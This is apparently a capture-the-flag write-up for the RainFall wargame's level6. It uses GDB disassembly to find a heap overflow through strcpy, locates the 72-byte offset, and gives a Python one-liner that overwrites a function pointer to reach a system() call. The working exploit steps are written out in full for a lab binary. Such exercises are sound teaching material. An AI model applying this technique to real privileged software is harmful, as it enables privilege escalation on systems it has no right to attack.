```sh
level6@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level6 level6   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level6 level6  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level6 level6 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level7 users  5274 Mar  6  2016 level6
-rw-r--r--+ 1 level6 level6   65 Sep 23  2015 .pass
-rw-r--r--  1 level6 level6  675 Apr  3  2012 .profile
level6@RainFall:~$ ./level6 
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 42
Nope
level6@RainFall:~$ 
```
There is one excutable file **level6**, it take argument but return Nope, without argument its Segmentation fault. \
\
Runt the binary file with GDB.
```sh
(gdb) info functions
...
0x08048454  n
0x08048468  m
0x0804847c  main
...


(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
   0x080484d2 <+86>:    leave  
   0x080484d3 <+87>:    ret    
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave  
   0x08048467 <+19>:    ret    
End of assembler dump.
(gdb) disas m
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave  
   0x0804847b <+19>:    ret    
End of assembler dump.
```
You can see line +41 in main() function,
```sh
(gdb) disas main
Dump of assembler code for function main:
...
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
...
(gdb) x/s 0x8048468
0x8048468 <m>:   "U\211\345\203\354\030\307\004$х\004\b\350\346
...
```
There is evidence of using ```m()``` function by variable. \
Anyway, We will check buffer overflow with strcpy,
```sh
(gdb) r 'aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0a'
Starting program: /home/user/level6/level6 'aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0a'

Program received signal SIGSEGV, Segmentation fault.
0x61346361 in ?? ()
Enter the hex value to find (e.g., 0x63613563): 0x61346361
Little Endian ASCII representation: 'ac4a'
'ac4a' found at offset: 72
```
With our python script, we can easily find offset of overflow. \
Since this code accepts argument not as stdin but as argv, we have to pass our input with shell argument ```$()```. \
So we can run simply ```Some 72 bytes + Start address of n() function```.
```sh
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
level6@RainFall:~$ python -c 'print "aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3" + "\x54\x84\x04\x08"' > /tmp/exploit5
level6@RainFall:~$ ./level6 $(cat /tmp/exploit5)
(hidden)
```
level6 passed !